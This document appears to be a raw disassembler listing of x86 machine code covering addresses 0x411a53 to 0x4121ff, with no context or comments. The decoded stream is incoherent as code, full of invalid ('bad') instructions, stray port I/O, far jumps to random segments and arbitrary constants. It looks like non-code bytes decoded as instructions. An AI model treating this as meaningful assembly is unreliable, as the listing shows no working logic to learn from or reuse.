  411a53:	mov    ebx,0x283131da
  411a58:	sahf   
  411a59:	xor    bl,BYTE PTR [eax]
  411a5b:	sub    esi,DWORD PTR [eax+0x3b]
  411a5e:	out    dx,eax
  411a5f:	dec    ebx
  411a60:	div    DWORD PTR [edi+0xcda6a62]
  411a66:	mov    esi,0x7d313c54
  411a6b:	mov    ds:0x137463f3,eax
  411a70:	inc    esp
  411a71:	pop    ecx
  411a72:	repnz loopne 0x411a19
  411a75:	push   0xf8cec09e
  411a7a:	sub    al,0x53
  411a7c:	jo     0x411ad0
  411a7e:	push   0xbbf01626
  411a83:	std    
  411a84:	leave  
  411a85:	jecxz  0x411a32
  411a87:	and    al,0x7a
  411a89:	cwde   
  411a8a:	pop    esp
  411a8b:	popf   
  411a8c:	imul   ecx,DWORD PTR [eax+0x7f963a83],0x24
  411a93:	and    DWORD PTR [eax],ebp
  411a95:	jmp    0x411a98
  411a97:	lods   eax,DWORD PTR ds:[esi]
  411a98:	(bad)  
  411a99:	push   esi
  411a9a:	push   0xffffffcd
  411a9c:	int3   
  411a9d:	xchg   DWORD PTR [eax+0x42bacf9a],esp
  411aa3:	inc    ebx
  411aa4:	jg     0x411a58
  411aa6:	or     eax,0x279e80ac
  411aab:	and    dh,BYTE PTR [eax+0x1c9a5645]
  411ab1:	mov    ds:0x61ce2ee3,al
  411ab6:	ret    
  411ab7:	jo     0x411a7b
  411ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aba:	cmp    al,0x99
  411abc:	push   cs
  411abd:	mov    DWORD PTR [ebx+0x17],ebp
  411ac0:	xor    DWORD PTR ds:[edx-0x7a863a65],esi
  411ac7:	or     al,0x71
  411ac9:	mov    ebp,0xca6296f
  411ace:	fsubr  DWORD PTR [ebx+0x4acbb8fd]
  411ad4:	fmulp  st(1),st
  411ad6:	pushf  
  411ad7:	cmp    DWORD PTR [ebx+ebx*4-0x4b],ebp
  411adb:	inc    esi
  411adc:	sub    cl,al
  411ade:	lods   al,BYTE PTR ds:[esi]
  411adf:	push   ebx
  411ae0:	mov    ds:0xf5497dd7,al
  411ae5:	pop    es
  411ae6:	fistp  QWORD PTR [edi+ebx*4]
  411ae9:	retf   
  411aea:	jmp    0xbdd9:0x625fd586
  411af1:	and    al,0x21
  411af3:	fimul  DWORD PTR [edx]
  411af5:	cdq    
  411af6:	jbe    0x411afe
  411af8:	in     al,dx
  411af9:	and    BYTE PTR [edi+0x5c028d4a],ch
  411aff:	add    esp,DWORD PTR [ebx+edi*1]
  411b02:	and    bl,BYTE PTR [ebx+edi*1]
  411b05:	mov    ecx,0x51b979ea
  411b0a:	leave  
  411b0b:	add    al,0xb2
  411b0d:	ret    
  411b0e:	fcom   QWORD PTR [ebp+0x2dcaed19]
  411b14:	push   es
  411b15:	and    DWORD PTR [ebx+0x1f],edi
  411b18:	dec    eax
  411b19:	ins    DWORD PTR es:[edi],dx
  411b1a:	(bad)  
  411b1b:	xchg   esi,eax
  411b1c:	mov    bh,0xe4
  411b1e:	push   ss
  411b1f:	loope  0x411ac2
  411b21:	jae    0x411b09
  411b23:	dec    ebx
  411b24:	es inc edx
  411b26:	mov    bl,BYTE PTR [esp+eax*2-0x6b095e0b]
  411b2d:	mov    bl,0xf8
  411b2f:	test   BYTE PTR [ebp+esi*2+0x14],0xc0
  411b34:	sbb    BYTE PTR [edx+0x65dd65bf],0x99
  411b3b:	mov    al,0x3b
  411b3d:	xor    DWORD PTR [edi],ebx
  411b3f:	(bad)  
  411b40:	shl    BYTE PTR [edi],1
  411b42:	pop    esi
  411b43:	adc    eax,0xaa389785
  411b48:	mov    ch,0x6a
  411b4a:	cs cmp dl,cl
  411b4d:	out    0xbc,al
  411b4f:	dec    ecx
  411b50:	mov    ch,0xd9
  411b52:	jg     0x411b4c
  411b54:	jmp    0x9197:0xfe2c5e82
  411b5b:	mov    al,ds:0xb9f52d83
  411b60:	sub    al,0x2
  411b62:	sbb    dl,BYTE PTR [esi-0x55394993]
  411b68:	clc    
  411b69:	sub    BYTE PTR [ebx-0x355659b7],al
  411b6f:	nop
  411b70:	dec    edx
  411b71:	es fs das 
  411b74:	pusha  
  411b75:	push   esp
  411b76:	dec    esp
  411b77:	pop    edx
  411b78:	lock xchg esi,edx
  411b7b:	mul    DWORD PTR [ecx-0x1d]
  411b7e:	or     DWORD PTR [ecx+0x3d],eax
  411b81:	lock mov dh,0x78
  411b84:	xor    eax,0x954410d7
  411b89:	pop    eax
  411b8a:	cs daa 
  411b8c:	jae    0x411bd9
  411b8e:	pusha  
  411b8f:	sbb    BYTE PTR [ebx],dh
  411b91:	pop    esp
  411b92:	jge    0x411c09
  411b94:	ret    0xeb0b
  411b97:	xchg   edi,eax
  411b98:	out    dx,al
  411b99:	bound  ebx,QWORD PTR [edx+0x15]
  411b9c:	or     ecx,ebp
  411b9e:	jmp    DWORD PTR [ecx]
  411ba0:	adc    bl,dl
  411ba2:	in     al,0xab
  411ba4:	gs retf 
  411ba6:	(bad)  
  411ba7:	xchg   edx,eax
  411ba8:	or     cl,BYTE PTR [edi+0x4e]
  411bab:	xor    edx,esp
  411bad:	push   ds
  411bae:	cld    
  411baf:	shl    DWORD PTR [edx-0x51011dd8],0x2d
  411bb6:	pop    ds
  411bb7:	pop    esp
  411bb8:	dec    ecx
  411bb9:	enter  0xc8e7,0xfe
  411bbd:	jb     0x411b81
  411bbf:	sbb    ebp,DWORD PTR [eiz*4+0xddc897b]
  411bc6:	cli    
  411bc7:	mov    ebp,0x51501503
  411bcc:	mov    eax,ds:0xfc6fb70
  411bd1:	popa   
  411bd2:	test   DWORD PTR [ecx-0x5e991868],esi
  411bd8:	adc    eax,0x88d39c69
  411bdd:	dec    ecx
  411bde:	leave  
  411bdf:	popa   
  411be0:	xchg   ebx,eax
  411be1:	sub    DWORD PTR [edx+0x6eecac09],0xcb8e3721
  411beb:	push   esp
  411bec:	sub    edx,esp
  411bee:	xor    cl,BYTE PTR [ebx]
  411bf0:	jno    0x411c01
  411bf2:	jns    0x411c46
  411bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf5:	in     eax,0x8b
  411bf7:	inc    ebp
  411bf8:	sub    ecx,0x3a
  411bfb:	mov    cl,0xee
  411bfd:	daa    
  411bfe:	push   0xffffff85
  411c00:	dec    edi
  411c01:	cld    
  411c02:	push   ds
  411c03:	mov    al,BYTE PTR [esp+eiz*8]
  411c06:	xor    ebx,DWORD PTR [edi-0x8]
  411c09:	inc    esp
  411c0a:	sub    edi,eax
  411c0c:	mov    ss,WORD PTR [ecx+0x6ce4aa71]
  411c12:	pop    ebp
  411c13:	cli    
  411c14:	pop    ebx
  411c15:	clc    
  411c16:	lods   al,BYTE PTR ds:[esi]
  411c17:	push   eax
  411c18:	call   0x4631:0x14279400
  411c1f:	ficomp DWORD PTR [ebp-0x18]
  411c22:	pop    edi
  411c23:	inc    ecx
  411c24:	test   al,0x89
  411c26:	(bad)  [esi+esi*8]
  411c29:	mov    ch,0x95
  411c2b:	in     eax,dx
  411c2c:	mov    WORD PTR es:[ebx],?
  411c2f:	pop    ebp
  411c30:	and    BYTE PTR [edx],bl
  411c32:	mov    ds:0x6d578bb5,eax
  411c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c38:	and    eax,0x776ae814
  411c3d:	or     BYTE PTR [ecx-0x49c819c3],cl
  411c43:	mov    cl,0xb1
  411c45:	gs dec esp
  411c47:	inc    ecx
  411c48:	imul   esi,DWORD PTR [ecx+0x72f1083d],0xdc99220
  411c52:	fcmovnbe st,st(3)
  411c54:	out    dx,eax
  411c55:	push   edx
  411c56:	pop    ecx
  411c57:	and    al,0x57
  411c59:	test   DWORD PTR [edx-0x43b94ab],eax
  411c5f:	push   ecx
  411c60:	adc    al,0xc3
  411c62:	in     al,dx
  411c63:	sub    al,0xee
  411c65:	std    
  411c66:	dec    ecx
  411c67:	and    bl,BYTE PTR [ebp-0x3d]
  411c6a:	pusha  
  411c6b:	repz std 
  411c6d:	out    0x1d,eax
  411c6f:	cmp    edx,DWORD PTR [ebx+0x7d]
  411c72:	inc    ebp
  411c73:	(bad)  
  411c74:	retf   
  411c75:	fcom   st(6)
  411c77:	popf   
  411c78:	call   0x429fee89
  411c7d:	adc    DWORD PTR [edi+eiz*8],0x7cb77e3d
  411c84:	fwait
  411c85:	sbb    DWORD PTR [edi],esp
  411c87:	das    
  411c88:	outs   dx,BYTE PTR ds:[esi]
  411c89:	lods   eax,DWORD PTR ds:[esi]
  411c8a:	lock or BYTE PTR [ebx-0x1a],dh
  411c8e:	imul   esi,DWORD PTR ds:0xbe76a666,0x1d9e5c2
  411c98:	and    DWORD PTR [ebp+0x39066f5a],edx
  411c9e:	cmp    al,0x81
  411ca0:	mov    ebp,0x34bd286e
  411ca5:	stos   DWORD PTR es:[edi],eax
  411ca6:	dec    ecx
  411ca7:	mov    bh,BYTE PTR [ebp-0x5d]
  411caa:	scas   eax,DWORD PTR es:[edi]
  411cab:	mov    bh,0xa1
  411cad:	enter  0x4525,0x23
  411cb1:	or     bh,BYTE PTR [ecx+0x16]
  411cb4:	fcomp  DWORD PTR [edx-0x35]
  411cb7:	test   DWORD PTR [edi+0x5f],0x87bafa75
  411cbe:	(bad)
  411cc1:	sbb    al,0xb8
  411cc3:	ret    
  411cc4:	xor    al,0xc
  411cc6:	retf   
  411cc7:	enter  0x86cc,0x75
  411ccb:	je     0x411c60
  411ccd:	add    al,BYTE PTR [esi]
  411ccf:	pop    edi
  411cd0:	cwde   
  411cd1:	(bad)  
  411cd2:	sub    al,0x7
  411cd4:	pop    esi
  411cd5:	add    BYTE PTR [edx],cl
  411cd7:	mov    esi,0xedef416b
  411cdc:	add    edx,DWORD PTR [eax+0x24c81142]
  411ce2:	pop    ss
  411ce3:	pop    ebp
  411ce4:	stc    
  411ce5:	cli    
  411ce6:	test   DWORD PTR [edi-0x2abc9b2f],edi
  411cec:	adc    edi,DWORD PTR [ebx]
  411cee:	aam    0x6b
  411cf0:	xor    BYTE PTR gs:[ebx+0x18],al
  411cf4:	pop    ebp
  411cf5:	aad    0xb
  411cf7:	sub    dl,bl
  411cf9:	xchg   ecx,eax
  411cfa:	adc    eax,0x93b93ea0
  411cff:	ss jg  0x411d21
  411d02:	cld    
  411d03:	ret    0xb370
  411d06:	xor    esi,DWORD PTR [esi]
  411d08:	sbb    edx,esp
  411d0a:	outs   dx,BYTE PTR ds:[esi]
  411d0b:	neg    cl
  411d0d:	dec    ecx
  411d0e:	mov    dl,0x96
  411d10:	cmp    BYTE PTR [esi-0x5a],bl
  411d13:	je     0x411d2a
  411d15:	test   ah,al
  411d17:	pop    es
  411d18:	lock mov ebx,ds
  411d1b:	push   edx
  411d1c:	adc    edi,DWORD PTR [esi+0x22]
  411d1f:	push   0xffffffdd
  411d21:	ds mov esp,0x8d360319
  411d27:	into   
  411d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d29:	pop    ds
  411d2a:	(bad)  
  411d2b:	ret    
  411d2c:	ja     0x411d83
  411d2e:	adc    BYTE PTR [edi-0x77],cl
  411d31:	and    al,0x97
  411d33:	push   ss
  411d34:	xchg   ebp,eax
  411d35:	lods   eax,DWORD PTR ds:[esi]
  411d36:	ins    DWORD PTR es:[edi],dx
  411d37:	jg     0x411da5
  411d39:	push   cs
  411d3a:	aas    
  411d3b:	into   
  411d3c:	hlt    
  411d3d:	push   0x128891ef
  411d42:	and    al,0xd9
  411d44:	push   ss
  411d45:	lods   al,BYTE PTR ds:[esi]
  411d46:	sbb    ah,BYTE PTR ds:0xb3f15a68
  411d4c:	xchg   esi,eax
  411d4d:	jnp    0x411d39
  411d4f:	(bad)  
  411d51:	pop    ecx
  411d52:	pop    esi
  411d53:	inc    edx
  411d54:	push   esi
  411d55:	push   edx
  411d56:	enter  0x1911,0x1f
  411d5a:	inc    ecx
  411d5b:	dec    ebp
  411d5c:	arpl   WORD PTR [edi],dx
  411d5e:	push   0x49
  411d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d61:	in     al,dx
  411d62:	int    0x90
  411d64:	arpl   cx,dx
  411d66:	mov    ah,BYTE PTR [edx+edx*4]
  411d69:	cmp    BYTE PTR [edi-0x4049d67e],ah
  411d6f:	ins    BYTE PTR es:[edi],dx
  411d70:	mov    eax,ds:0x28ed9056
  411d75:	jnp    0x411de7
  411d77:	das    
  411d78:	lea    edi,[edx+0x3]
  411d7b:	xchg   ebp,esp
  411d7d:	push   edi
  411d7e:	nop
  411d7f:	ja     0x411d81
  411d81:	sbb    edi,eax
  411d83:	loop   0x411d87
  411d85:	ficomp WORD PTR [edi+0x5a]
  411d88:	xchg   esi,eax
  411d89:	das    
  411d8a:	push   cs
  411d8b:	push   ds
  411d8c:	cmp    esp,esi
  411d8e:	test   al,0x90
  411d90:	mov    al,0xc0
  411d92:	pxor   mm3,QWORD PTR [edx+0x1d31715b]
  411d99:	ret    0x17da
  411d9c:	and    DWORD PTR [eax+0x51],ebp
  411d9f:	mov    edi,0xd0438719
  411da4:	gs jb  0x411d89
  411da7:	inc    ecx
  411da8:	(bad)  
  411da9:	jno    0x411d97
  411dab:	mov    dh,0x8
  411dad:	mov    ebx,0xdeaceeab
  411db2:	imul   eax,DWORD PTR [ecx+edi*2-0x4a],0x9ceac4c0
  411dba:	hlt    
  411dbb:	rol    BYTE PTR [ecx-0x78],0x2f
  411dbf:	ins    BYTE PTR es:[edi],dx
  411dc0:	jbe    0x411e3c
  411dc2:	es dec esp
  411dc4:	inc    edi
  411dc5:	call   0x2977073f
  411dca:	bound  edx,QWORD PTR [ebx-0x1b]
  411dcd:	sbb    al,0x23
  411dcf:	jecxz  0x411d95
  411dd1:	xlat   BYTE PTR ds:[ebx]
  411dd2:	sti    
  411dd3:	pop    esi
  411dd4:	out    dx,eax
  411dd5:	push   ebx
  411dd6:	dec    ebp
  411dd7:	or     ch,BYTE PTR [ecx-0x57]
  411dda:	or     DWORD PTR [edx],edx
  411ddc:	mov    WORD PTR ds:0x37ea919a,cs
  411de2:	xor    ah,BYTE PTR [ecx-0x38]
  411de5:	cli    
  411de6:	rol    DWORD PTR [ecx],cl
  411de8:	push   ebx
  411de9:	add    BYTE PTR [ebp-0x3b2ec5ce],0x36
  411df0:	dec    ebp
  411df1:	jecxz  0x411dd4
  411df3:	arpl   WORD PTR [ebx+ebp*8+0xfa33bfc],di
  411dfa:	mov    eax,0xbdc9675
  411dff:	(bad)  
  411e00:	in     al,dx
  411e01:	lock sbb ecx,DWORD PTR [ebx-0x72]
  411e05:	or     al,0x6
  411e07:	or     bh,BYTE PTR [eax]
  411e09:	dec    edx
  411e0a:	cwde   
  411e0b:	arpl   cx,di
  411e0d:	dec    eax
  411e0e:	std    
  411e0f:	mov    esi,0xd58bdf34
  411e14:	call   0xc03767b3
  411e19:	test   al,0xa7
  411e1b:	test   al,0xeb
  411e1d:	jb     0x411e77
  411e1f:	stc    
  411e20:	loopne 0x411e97
  411e22:	cmp    eax,0xe34ea6b3
  411e27:	cmp    eax,DWORD PTR [esi]
  411e29:	mov    ?,WORD PTR [eax+0x7b99d6e1]
  411e2f:	mov    ebp,DWORD PTR [eax-0x2c]
  411e32:	into   
  411e33:	sub    eax,0xb781b6b4
  411e38:	fs call 0x80f677c8
  411e3e:	jae    0x411e98
  411e40:	leave  
  411e41:	inc    esp
  411e42:	icebp  
  411e43:	in     eax,dx
  411e44:	popf   
  411e45:	sub    al,0xac
  411e47:	lods   al,BYTE PTR ds:[esi]
  411e48:	ret    
  411e49:	sub    ch,dl
  411e4b:	sbb    al,0x92
  411e4d:	int3   
  411e4e:	(bad)  
  411e4f:	mov    cl,0x17
  411e51:	push   ss
  411e52:	push   ecx
  411e53:	inc    edx
  411e54:	(bad)  
  411e55:	push   0xffffffb8
  411e57:	add    al,0x72
  411e59:	inc    ebx
  411e5a:	nop
  411e5b:	push   0x74
  411e5d:	(bad)  
  411e5e:	fmul   DWORD PTR [edx+0x55]
  411e61:	(bad)  
  411e62:	idiv   BYTE PTR ds:0x127f0b14
  411e68:	mov    ebx,0x92c47d0d
  411e6d:	stos   BYTE PTR es:[edi],al
  411e6e:	mov    eax,0x2e69ece9
  411e73:	fidiv  WORD PTR [edx+0x136b9f18]
  411e79:	aaa    
  411e7a:	jne    0x411edd
  411e7c:	mov    ch,0x58
  411e7e:	cmp    DWORD PTR [ebx+0x750ec402],0xffffff91
  411e85:	aas    
  411e86:	add    eax,0xea0e40e8
  411e8b:	and    BYTE PTR [esi],dl
  411e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e8e:	pop    esp
  411e8f:	test   BYTE PTR [esp-0x281f0253],cl
  411e96:	mov    ecx,0xbc8b9b4e
  411e9b:	push   0x9f1b54d7
  411ea0:	cwde   
  411ea1:	pop    es
  411ea2:	inc    ebx
  411ea3:	mov    ecx,0x6d9e35b4
  411ea8:	je     0x411ee7
  411eaa:	mov    ecx,0x5ab459b3
  411eaf:	daa    
  411eb0:	cmp    DWORD PTR [ebx],eax
  411eb2:	lods   eax,DWORD PTR ds:[esi]
  411eb3:	mov    DWORD PTR [ebx+0x62],ebp
  411eb6:	cld    
  411eb7:	sub    eax,edx
  411eb9:	sub    ebp,ecx
  411ebb:	ss repnz in eax,dx
  411ebe:	push   esi
  411ebf:	jno    0x411ec0
  411ec1:	or     edi,DWORD PTR [eax-0x2e]
  411ec4:	ret    
  411ec5:	mov    bl,0xc0
  411ec7:	loopne 0x411f42
  411ec9:	(bad)  
  411eca:	cdq    
  411ecb:	dec    eax
  411ecc:	xlat   BYTE PTR gs:[ebx]
  411ece:	push   ecx
  411ecf:	add    bl,BYTE PTR [eax+edx*8+0x2a819516]
  411ed6:	cmp    al,0x57
  411ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ed9:	cdq    
  411eda:	adc    ebx,eax
  411edc:	ficom  DWORD PTR cs:[ebx]
  411edf:	pop    eax
  411ee0:	and    eax,DWORD PTR [edx]
  411ee2:	test   DWORD PTR [edi],ebp
  411ee4:	push   ebx
  411ee5:	int    0xec
  411ee7:	test   BYTE PTR [edi+0x78],al
  411eea:	cdq    
  411eeb:	addr16 pop es
  411eed:	mov    bh,BYTE PTR [edi-0x433eecd8]
  411ef3:	inc    BYTE PTR [eax+0x3eca1be7]
  411ef9:	mov    edx,0x117ab8a7
  411efe:	out    0x2a,eax
  411f00:	repnz cmc 
  411f02:	ret    0xd801
  411f05:	sbb    cl,BYTE PTR [ecx+0x67]
  411f08:	fdiv   st,st(1)
  411f0a:	adc    eax,0xb40454f8
  411f0f:	or     DWORD PTR [eax+ecx*8],ecx
  411f12:	inc    ebp
  411f13:	push   0xaa0dde1a
  411f18:	xor    edi,DWORD PTR [esi+0x3d3f9f98]
  411f1e:	(bad)  
  411f1f:	push   ss
  411f20:	cli    
  411f21:	sub    BYTE PTR [edx],0x23
  411f24:	and    DWORD PTR [ebx+0x28],esp
  411f27:	lahf   
  411f28:	mov    al,0xac
  411f2a:	(bad)  
  411f2b:	frstor [eax]
  411f2d:	(bad)  
  411f2e:	ficom  WORD PTR [eax-0x11c486db]
  411f34:	fstp   TBYTE PTR [ecx]
  411f36:	fstp   TBYTE PTR [edi]
  411f38:	add    al,0x8
  411f3a:	push   0xd42382de
  411f3f:	xlat   BYTE PTR ds:[ebx]
  411f40:	in     al,0x24
  411f42:	loop   0x411f44
  411f44:	lods   eax,DWORD PTR ds:[esi]
  411f45:	and    eax,0xfb51d76
  411f4a:	int    0x7f
  411f4c:	jp     0x411fb7
  411f4e:	data16 int 0x0
  411f51:	inc    ebp
  411f52:	jp     0x411ee8
  411f54:	sub    eax,0xf26771fc
  411f59:	pusha  
  411f5a:	sbb    esi,DWORD PTR [ecx]
  411f5c:	into   
  411f5d:	sub    DWORD PTR [esi],ebx
  411f5f:	jecxz  0x411f98
  411f61:	ds mov eax,0x1c1857cf
  411f67:	cs mov esp,0x654dea05
  411f6d:	clc    
  411f6e:	or     al,0x34
  411f70:	or     ebp,DWORD PTR [ebp+0x22bf54e1]
  411f76:	sbb    DWORD PTR [edi+esi*2-0x11],edx
  411f7a:	cmp    al,0x0
  411f7c:	outs   dx,DWORD PTR ds:[esi]
  411f7d:	mov    eax,ds:0x9dfc3fc9
  411f82:	lods   eax,DWORD PTR ds:[esi]
  411f83:	out    dx,al
  411f84:	(bad)  [esi-0x29f9ea73]
  411f8a:	pop    eax
  411f8b:	clc    
  411f8c:	inc    esp
  411f8d:	and    ecx,edi
  411f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f90:	inc    edi
  411f91:	gs fwait
  411f93:	adc    dl,BYTE PTR [edx]
  411f95:	mov    ah,0x77
  411f97:	pop    edi
  411f98:	add    eax,0x990199b2
  411f9d:	inc    ebp
  411f9e:	hlt    
  411f9f:	sub    ah,BYTE PTR [edx]
  411fa1:	jbe    0x411fa0
  411fa3:	sbb    esi,DWORD PTR ds:0x1b0b1cd6
  411fa9:	mov    bh,0xd3
  411fab:	test   al,0x47
  411fad:	addr16 push ss
  411faf:	ds push es
  411fb1:	mov    ah,0x17
  411fb3:	iret   
  411fb4:	sbb    eax,0xb323af4a
  411fb9:	pop    ss
  411fba:	add    DWORD PTR [esi-0x4c3ce41a],esp
  411fc0:	sar    BYTE PTR [ebp-0x3f],0x26
  411fc4:	xor    eax,0x81758b4c
  411fc9:	add    DWORD PTR [edi],ecx
  411fcb:	mov    esp,0xe96bcf4e
  411fd0:	iret   
  411fd1:	pop    edx
  411fd2:	fcom   QWORD PTR [ebx]
  411fd4:	call   0xa09c:0x56470e11
  411fdb:	or     al,0x49
  411fdd:	ret    
  411fde:	push   ecx
  411fdf:	in     eax,0xa8
  411fe1:	outs   dx,BYTE PTR ds:[si]
  411fe3:	shr    BYTE PTR [ecx+0x50],0x91
  411fe7:	mov    ch,0xf1
  411fe9:	popf   
  411fea:	test   DWORD PTR [esi-0x6b72cabb],0xebedcd4c
  411ff4:	xchg   edx,eax
  411ff5:	inc    eax
  411ff6:	jge    0x411fad
  411ff8:	and    DWORD PTR [edi],ecx
  411ffa:	dec    edx
  411ffb:	clc    
  411ffc:	cmp    edx,eax
  411ffe:	push   ecx
  411fff:	clc    
  412000:	jg     0x411f9c
  412002:	jmp    0x411fe3
  412004:	jp     0x411fb1
  412006:	pushf  
  412007:	cmp    eax,0x1c21951d
  41200c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41200d:	sbb    ebp,DWORD PTR [ebx+eiz*4-0x7c25fe5a]
  412014:	cmp    ecx,ebx
  412016:	test   BYTE PTR [ecx+ebp*8],0x81
  41201a:	and    al,0x45
  41201c:	sub    cl,ch
  41201e:	sub    eax,0x39f03a66
  412023:	pop    eax
  412024:	lock push cs
  412026:	fisttp DWORD PTR [edi-0x52]
  412029:	sahf   
  41202a:	jmp    0x1bd05e5c
  41202f:	les    ebx,FWORD PTR ds:0xf11bbe0
  412035:	ins    DWORD PTR es:[edi],dx
  412036:	(bad)  
  412037:	out    0x27,al
  412039:	(bad)  
  41203a:	mov    ebp,0x6dd870c2
  41203f:	stc    
  412040:	test   DWORD PTR [esi],edi
  412042:	cwde   
  412043:	mov    BYTE PTR [edi],al
  412045:	sbb    eax,0x8bb3f1c5
  41204a:	xor    ch,0xc8
  41204d:	ss pop edi
  41204f:	jns    0x4120a3
  412051:	and    al,0x5c
  412053:	fs mov cl,0xcd
  412056:	popa   
  412057:	jns    0x412001
  412059:	xchg   ebx,eax
  41205a:	mov    dh,0x73
  41205c:	push   ecx
  41205d:	mov    DWORD PTR [esi-0x38764190],esi
  412063:	in     eax,dx
  412064:	stos   DWORD PTR es:[edi],eax
  412065:	ret    0x7462
  412068:	dec    ebx
  412069:	addr16 adc eax,0xf318540d
  41206f:	xchg   BYTE PTR [edx+ebx*1+0x7d],ch
  412073:	mov    esp,DWORD PTR [edi+eax*1+0x5ee86bc7]
  41207a:	push   edi
  41207b:	outs   dx,BYTE PTR ds:[esi]
  41207c:	inc    esi
  41207d:	jecxz  0x4120de
  41207f:	outs   dx,BYTE PTR ds:[esi]
  412080:	add    BYTE PTR [ebp-0x123766ee],0x8a
  412087:	sub    al,0x6d
  412089:	dec    ebp
  41208a:	add    esi,esp
  41208c:	cli    
  41208d:	lock cli 
  41208f:	inc    edx
  412090:	jp     0x41203e
  412092:	mov    ch,0x76
  412094:	xchg   ecx,eax
  412095:	shl    ecx,cl
  412097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412098:	dec    ecx
  412099:	mov    dl,0x1d
  41209b:	lods   eax,DWORD PTR ds:[esi]
  41209c:	mov    ah,0x49
  41209e:	ficomp DWORD PTR [ebx-0x4fb9f13c]
  4120a4:	mov    al,0xb1
  4120a6:	jo     0x412126
  4120a8:	fnstcw WORD PTR [edi]
  4120aa:	add    DWORD PTR [ebx-0xf],edi
  4120ad:	fcom   QWORD PTR [esi-0x5f43b1a7]
  4120b3:	sub    edi,DWORD PTR [edx]
  4120b5:	xchg   esp,eax
  4120b6:	xchg   esi,eax
  4120b7:	jmp    0x4120e0
  4120b9:	daa    
  4120ba:	aam    0x4a
  4120bc:	jmp    FWORD PTR [esi+0x4c]
  4120bf:	mov    bh,0xb0
  4120c1:	stos   DWORD PTR es:[edi],eax
  4120c2:	stos   BYTE PTR es:[edi],al
  4120c3:	(bad)  
  4120c4:	jo     0x4120ba
  4120c6:	mov    es,eax
  4120c8:	jb     0x41206f
  4120ca:	js     0x4120e7
  4120cc:	or     esi,edi
  4120ce:	xchg   DWORD PTR [edi-0x547c7e11],ecx
  4120d4:	icebp  
  4120d5:	sub    al,0xa2
  4120d7:	cmp    al,0xcd
  4120d9:	(bad)  
  4120db:	sbb    dh,BYTE PTR [edx-0x12]
  4120de:	scas   al,BYTE PTR es:[edi]
  4120df:	jmp    0x8806:0x92a46f65
  4120e6:	ds jae 0x41211c
  4120e9:	cmp    eax,0x8a1af5a9
  4120ee:	add    bh,BYTE PTR [ebp-0x7294196a]
  4120f4:	fidivr DWORD PTR [ebp-0x5b]
  4120f7:	aam    0xfd
  4120f9:	test   eax,0x46e2432f
  4120fe:	enter  0x1b20,0x47
  412102:	(bad)  
  412103:	(bad)  
  412104:	sub    BYTE PTR [ecx],ch
  412106:	pop    ds
  412107:	sub    BYTE PTR [esp+eiz*2-0x241019a6],ch
  41210e:	inc    ebx
  41210f:	pusha  
  412110:	cs leave 
  412112:	jae    0x412174
  412114:	add    DWORD PTR [edi+0x1073351d],esi
  41211a:	xchg   ebp,eax
  41211b:	sub    bl,BYTE PTR [ebx+0x3]
  41211e:	or     eax,0xe8c9c79a
  412123:	mov    esi,0xeb2cc22c
  412128:	fidivr DWORD PTR [edi+0x6ddd75a1]
  41212e:	fdiv   QWORD PTR [ecx+0x2dfd572c]
  412134:	jp     0x41213a
  412136:	dec    esi
  412137:	mov    al,al
  412139:	jecxz  0x41216e
  41213b:	add    DWORD PTR ds:0xb77e433f,ebx
  412141:	jno    0x412173
  412143:	rcl    DWORD PTR ds:0x7b7bcee1,1
  412149:	add    eax,0x4f8ce00b
  41214e:	mov    ecx,0x46e96f46
  412153:	fwait
  412154:	or     DWORD PTR [edx],edi
  412156:	jmp    0x412183
  412158:	cmp    al,al
  41215a:	pop    eax
  41215b:	mov    cl,BYTE PTR [edx+ecx*8-0x6cb0e893]
  412162:	clc    
  412163:	gs aad 0xf6
  412166:	(bad)  
  412167:	xchg   ebx,eax
  412168:	call   0x6aad:0x4d13d516
  41216f:	ror    DWORD PTR [ecx+ecx*4+0x6df8a02b],cl
  412176:	imul   esi,DWORD PTR [ecx-0x30],0xa0141719
  41217d:	xchg   DWORD PTR [edi+0x5c],ecx
  412180:	dec    ebp
  412181:	pop    ds
  412182:	push   cs
  412183:	out    0x9,eax
  412185:	jle    0x4121a0
  412187:	ret    
  412188:	jle    0x41219e
  41218a:	stos   BYTE PTR es:[edi],al
  41218b:	aad    0x7
  41218d:	in     al,0x7
  41218f:	(bad)  
  412191:	mov    dh,0xd2
  412193:	cmp    bl,BYTE PTR [ebp-0x6b]
  412196:	outs   dx,BYTE PTR ds:[esi]
  412197:	neg    BYTE PTR [ebx+eax*1-0x6fbf1479]
  41219e:	jbe    0x4121df
  4121a0:	ins    DWORD PTR es:[edi],dx
  4121a1:	retf   
  4121a2:	ret    
  4121a3:	push   ss
  4121a4:	mov    bl,BYTE PTR [eax+ecx*8-0x572e83ba]
  4121ab:	adc    BYTE PTR [edi+0x309eb0d7],dh
  4121b1:	es dec edi
  4121b3:	or     BYTE PTR [ebx],bl
  4121b5:	dec    edx
  4121b6:	xchg   edi,eax
  4121b7:	adc    al,0xba
  4121b9:	cmp    esp,DWORD PTR [edx+0x3721dec2]
  4121bf:	mov    eax,ds:0x9bd0f4f2
  4121c4:	inc    esi
  4121c5:	fadd   st(2),st
  4121c7:	fwait
  4121c8:	shl    DWORD PTR [edi-0x300dc50a],0xd1
  4121cf:	std    
  4121d0:	mov    ds:0x47f73c7f,eax
  4121d5:	cmp    BYTE PTR [edi-0x4178019d],bh
  4121db:	mov    dh,0xfe
  4121dd:	add    DWORD PTR [edx],esp
  4121df:	leave  
  4121e0:	mov    dl,0x4e
  4121e2:	das    
  4121e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e4:	(bad)  
  4121e5:	and    eax,0xafa50069
  4121ea:	inc    ebp
  4121eb:	adc    eax,0x1c568a46
  4121f0:	fadd   st(0),st
  4121f2:	mov    esi,fs
  4121f4:	inc    esi
  4121f5:	dec    ecx
  4121f6:	shl    DWORD PTR [esi-0x3456a261],1
  4121fc:	sbb    ch,al
  4121fe:	inc    edx
  4121ff:	push   eax
